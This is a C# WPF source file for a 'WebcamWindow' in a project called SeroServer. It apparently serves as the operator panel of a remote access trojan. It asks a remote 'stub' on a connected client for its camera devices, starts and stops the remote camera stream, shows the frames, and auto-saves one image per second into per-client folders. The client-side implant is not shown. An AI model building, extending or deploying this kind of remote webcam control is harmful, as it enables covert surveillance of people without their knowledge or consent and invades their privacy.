using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class WebcamWindow : Window
{
    private readonly TlsServer _server;
    private readonly string _clientId;
    private volatile bool _closed, _streaming;
    private readonly System.Text.StringBuilder _logBuf = new();
    private int _frameCount;
    private DateTime _fpsTime = DateTime.UtcNow;
    private BitmapImage? _lastFrame;
    private DateTime _lastAutoSave = DateTime.MinValue;

    public WebcamWindow(TlsServer server, string clientId)
    {
        _server   = server;
        _clientId = clientId;
        InitializeComponent();

        TxtClientId.Text = $"[ {clientId} ]";

        SldQuality.ValueChanged += (_, e) => TxtQuality.Text = $"{(int)e.NewValue}";
        SldFps.ValueChanged     += (_, e) => TxtFpsVal.Text  = $"{(int)e.NewValue}";

        _server.WcamFrameReceived  += OnWcamData;
        _server.ClientDisconnected += OnClientDisconnected;
        Closed += (_, _) =>
        {
            _closed = true;
            _server.WcamFrameReceived  -= OnWcamData;
            _server.ClientDisconnected -= OnClientDisconnected;
            if (_streaming) SendStop();
        };

        // Fade-in animation
        Opacity = 0;
        Loaded += (_, _) =>
        {
            BeginAnimation(OpacityProperty,
                new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
            SendProbe(); // request device list on open
        };
    }

    // ── Fullscreen ────────────────────────────────────────────────────────────

    private void BtnFullscreen_Click(object s, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            WindowState = WindowState.Normal;
            RootBorder.CornerRadius = new CornerRadius(10);
            BtnFullscreen.Content = "⛶";
        }
        else
        {
            WindowState = WindowState.Maximized;
            RootBorder.CornerRadius = new CornerRadius(0);
            BtnFullscreen.Content = "❐";
        }
    }

    // ── Streaming state ───────────────────────────────────────────────────────

    private void SetStreamingState(bool streaming)
    {
        _streaming = streaming;
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled   = !streaming;
            BtnStart.Opacity     = streaming ? 0.35 : 1.0;
            BtnStop.IsEnabled        = streaming;
            BtnStop.Opacity          = streaming ? 1.0 : 0.35;
            ChkAutoSave.IsEnabled    = streaming;
            ChkAutoSave.Opacity      = streaming ? 1.0 : 0.4;
            if (!streaming) ChkAutoSave.IsChecked = false;
            SldQuality.IsEnabled = !streaming;
            SldFps.IsEnabled     = !streaming;
            CmbDevice.IsEnabled  = !streaming;
            TxtStatus.Text       = streaming ? "Streaming..." : "Stopped";
            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
            if (streaming)
            {
                TxtPlaceholder.Visibility = Visibility.Collapsed;
                LogPanel.Visibility = Visibility.Collapsed;
            }
            if (!streaming) TxtFps.Text = "";
        });
    }

    // ── Outgoing ──────────────────────────────────────────────────────────────

    private void SendProbe()
    {
        _logBuf.Clear();
        TxtLog.Text = "";
        LogPanel.Visibility = Visibility.Collapsed;
        TxtPlaceholder.Text = "Waiting for device list...";
        TxtPlaceholder.Visibility = Visibility.Visible;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.WcamStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { DeviceIndex = -1, Quality = 0, Fps = 0 })
        });
    }

    private void SendStart()
    {
        int idx = CmbDevice.SelectedIndex;
        if (idx < 0) { TxtStatus.Text = "No device selected."; return; }
        _logBuf.Clear();
        TxtLog.Text = "";
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.WcamStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new
            {
                DeviceIndex = idx,
                Quality     = (int)SldQuality.Value,
                Fps         = (int)SldFps.Value
            })
        });
        SetStreamingState(true);
    }

    private void SendStop()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WcamStop, Data = "{}" });
        SetStreamingState(false);
    }

    // ── Incoming ──────────────────────────────────────────────────────────────

    private void OnWcamData(string clientId, string json)
    {
        if (_closed || clientId != _clientId) return;
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // Debug logs from stub are silently discarded (no display pollution)
            if (root.TryGetProperty("log", out _))
                return;

            // Error from stub
            if (root.TryGetProperty("error", out var errEl))
            {
                string msg = errEl.GetString() ?? "Unknown error";
                Dispatcher.BeginInvoke(() =>
                {
                    TxtStatus.Text = msg;
                    TxtPlaceholder.Text = msg;
                    TxtPlaceholder.Visibility = Visibility.Visible;
                    LogPanel.Visibility = _logBuf.Length > 0 ? Visibility.Visible : Visibility.Collapsed;
                    SetStreamingState(false);
                });
                return;
            }

            // Device list
            if (root.TryGetProperty("devices", out var devList))
            {
                Dispatcher.Invoke(() =>
                {
                    CmbDevice.Items.Clear();
                    int count = 0;
                    foreach (var d in devList.EnumerateArray())
                    {
                        string name = d.ValueKind == System.Text.Json.JsonValueKind.Object
                            ? (d.TryGetProperty("name", out var nEl) ? nEl.GetString() : null) ?? $"Device {count}"
                            : d.GetString() ?? $"Device {count}";
                        CmbDevice.Items.Add(name);
                        count++;
                    }
                    if (count == 0)
                    {
                        TxtStatus.Text = "No webcam device found on client.";
                        TxtPlaceholder.Text = "No webcam device found on client.";
                        TxtPlaceholder.Visibility = Visibility.Visible;
                    }
                    else
                    {
                        // Preserve selected index when streaming (device list arrives again on capture start)
                        if (!_streaming || CmbDevice.SelectedIndex < 0 || CmbDevice.SelectedIndex >= count)
                        {
                            CmbDevice.SelectedIndex = 0;
                            CmbDevice.Text = CmbDevice.Items[0]?.ToString() ?? "";
                        }
                        TxtStatus.Text = $"{count} device(s) — click START.";
                    }
                });
                return;
            }

            // Frame
            if (!root.TryGetProperty("j", out var jEl)) return;
            string j64 = jEl.GetString() ?? "";
            if (string.IsNullOrEmpty(j64)) return;

            Task.Run(() =>
            {
                try
                {
                    var bytes = Convert.FromBase64String(j64);
                    using var ms = new MemoryStream(bytes);
                    var bi = new BitmapImage();
                    bi.BeginInit();
                    bi.StreamSource = ms;
                    bi.CacheOption = BitmapCacheOption.OnLoad;
                    bi.EndInit();
                    bi.Freeze();
                    if (!_closed) Dispatcher.BeginInvoke(() => ShowFrame(bi));
                }
                catch { }
            });
        }
        catch { }
    }

    private void ShowFrame(BitmapImage bi)
    {
        if (_closed) return;
        _lastFrame = bi;
        ImgFrame.Source = bi;
        TxtPlaceholder.Visibility = Visibility.Collapsed;
        _frameCount++;
        var now = DateTime.UtcNow;
        if ((now - _fpsTime).TotalSeconds >= 1)
        {
            TxtFps.Text = $"{_frameCount} fps";
            _frameCount = 0;
            _fpsTime = now;
        }

        // Auto-save: one frame per second while checkbox is checked
        if (ChkAutoSave.IsChecked == true && (now - _lastAutoSave).TotalSeconds >= 1.0)
        {
            _lastAutoSave = now;
            SaveFrame(bi);
        }
    }

    private void SaveFrame(BitmapImage bi)
    {
        Task.Run(() =>
        {
            try
            {
                var dir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", _clientId, "Webcam");
                Directory.CreateDirectory(dir);
                var path = Path.Combine(dir, $"{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                using var fs = File.Create(path);
                var enc = new System.Windows.Media.Imaging.JpegBitmapEncoder { QualityLevel = 95 };
                enc.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(bi));
                enc.Save(fs);
                Dispatcher.BeginInvoke(() => TxtStatus.Text = $"Saved: {Path.GetFileName(path)}");
            }
            catch { }
        });
    }

    // ── UI ────────────────────────────────────────────────────────────────────

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(Close);
    }

    private void ChkAutoSave_Changed(object s, RoutedEventArgs e)
    {
        if (ChkAutoSave.IsChecked == true)
        {
            _lastAutoSave = DateTime.MinValue; // save immediately on first frame
            TxtStatus.Text = "Auto-save ON — saving to Clients folder...";
        }
        else
        {
            TxtStatus.Text = "Auto-save OFF";
        }
    }

    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
    private void BtnStop_Click(object s, RoutedEventArgs e)  => SendStop();
    private void Close_Click(object s, RoutedEventArgs e)    => Close();
    private void TitleBar_Drag(object s, MouseButtonEventArgs e) => DragMove();

    private void ResizeGrip_DragDelta(object s, DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }
}
